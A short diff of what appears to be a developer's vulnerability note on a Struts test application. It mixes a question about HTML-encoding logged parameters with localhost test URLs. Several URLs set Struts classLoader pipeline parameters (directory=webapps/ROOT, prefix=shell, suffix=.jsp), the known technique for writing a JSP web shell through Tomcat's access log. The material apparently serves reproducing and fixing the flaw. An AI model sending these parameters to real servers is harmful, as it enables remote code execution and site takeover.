@@ -11,3 +11,11 @@ class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
 class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=12
 
 During logging the parameter we need to encode it to avoid any further XSS issues for that we need to update the attached changes to take care of encoding. Can you please let me know if Alliance has this StringEscapeUtils.java class in use? We can use this to encode parameter for html encoding.
+
+http://localhost:8081/StrutsExample/EmployeeRegister.jsp
+
+http://localhost:8081/StrutsExample/Register.do?org.apache.struts.taglib.html.CANCEL=true
+
+http://localhost:8081/StrutsExample/Register.do?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+http://localhost:8081/StrutsExample/Register.do?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
+http://localhost:8081/StrutsExample/Register.do?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
